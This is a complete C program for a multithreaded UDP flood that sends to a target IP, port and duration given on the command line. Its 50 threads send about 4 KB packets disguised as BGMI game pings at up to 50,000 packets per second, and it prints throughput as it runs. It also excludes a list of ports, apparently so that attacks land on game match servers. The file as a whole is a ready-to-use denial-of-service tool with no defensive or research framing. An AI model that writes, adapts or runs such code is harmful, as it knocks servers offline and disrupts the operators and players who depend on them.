#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>

#define PACKET_SIZE 4096
#define MAX_PACKETS_PER_SEC 50000
#define NAME_LENGTH 10
#define NUM_THREADS 50

struct flood_args {
    const char *target_ip;
    int target_port; // Exact port from input
    int duration;
    unsigned long *packets_sent;
    pthread_mutex_t *mutex;
};

int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    int sendbuf = 8 * 1024 * 1024;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf)) < 0) {
        perror("Warning: Failed to set send buffer size");
    }
    
    return sock;
}

char *generate_random_name(int length) {
    static const char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char *name = malloc(length + 1);
    if (!name) return NULL;
    
    for (int i = 0; i < length; i++) {
        name[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    name[length] = '\0';
    return name;
}

void *thread_flood(void *arg) {
    struct flood_args *args = (struct flood_args *)arg;
    int sock = create_socket();
    if (sock < 0) {
        pthread_exit(NULL);
    }

    srand(time(NULL) + (unsigned int)pthread_self());
    int thread_port = args->target_port; // Use exact port

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(thread_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    char packet[PACKET_SIZE];
    memset(packet, 'X', PACKET_SIZE - 1);
    packet[PACKET_SIZE - 1] = '\0';

    time_t start_time = time(NULL);

    while (time(NULL) - start_time < args->duration) {
        for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; i++) {
            char *name = generate_random_name(NAME_LENGTH);
            if (!name) continue;
            
            const char header[] = {0xFF, 0xFF, 0xFF, 0xFF};
            snprintf(packet, PACKET_SIZE, "%.*sBGMI:Player:%s:Ping:%d", 
                     4, header, name, rand() % 1000);
            free(name);
            
            ssize_t sent = sendto(sock, packet, PACKET_SIZE - 1, 0,
                                 (struct sockaddr *)&target, sizeof(target));
            if (sent > 0) {
                pthread_mutex_lock(args->mutex);
                (*args->packets_sent)++;
                pthread_mutex_unlock(args->mutex);
            } else if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                fprintf(stderr, "Thread %lu send failed: %s\n", 
                       (unsigned long)pthread_self(), strerror(errno));
            }
        }
        usleep(100);
    }
    
    close(sock);
    pthread_exit(NULL);
}

int udp_flood(const char *target_ip, int target_port, int duration) {
    pthread_t threads[NUM_THREADS];
    struct flood_args args;
    unsigned long packets_sent = 0;
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

    args.target_ip = target_ip;
    args.target_port = target_port;
    args.duration = duration;
    args.packets_sent = &packets_sent;
    args.mutex = &mutex;

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, thread_flood, &args) != 0) {
            perror("Thread creation failed");
            return -1;
        }
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sleep(1);
        pthread_mutex_lock(&mutex);
        printf("\rPackets sent: %lu (%.1f packets/sec, %.1f Mbps)", 
               packets_sent, (float)packets_sent / (time(NULL) - start_time),
               (float)packets_sent * PACKET_SIZE * 8 / (time(NULL) - start_time) / 1000000);
        fflush(stdout);
        pthread_mutex_unlock(&mutex);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_mutex_destroy(&mutex);
    printf("\nFlood completed. Total packets sent: %lu\n", packets_sent);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    srand(time(NULL));
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Port must be between 1 and 65535\n");
        return EXIT_FAILURE;
    }
    if (duration <= 0) {
        fprintf(stderr, "Duration must be positive\n");
        return EXIT_FAILURE;
    }
    
    // List of ports to avoid
    int ignore_ports[] = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030};
    int num_ignore_ports = sizeof(ignore_ports) / sizeof(ignore_ports[0]);
    int should_ignore = 0;
    for (int i = 0; i < num_ignore_ports; i++) {
        if (target_port == ignore_ports[i]) {
            should_ignore = 1;
            break;
        }
    }
    if (should_ignore) {
        fprintf(stderr, "Error: Port %d is in the ignore list\n", target_port);
        return EXIT_FAILURE;
    }
    
    printf("Starting UDP flood on %s:%d for %d seconds with %d threads\n", 
           target_ip, target_port, duration, NUM_THREADS);
    
    if (udp_flood(target_ip, target_port, duration) < 0) {
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}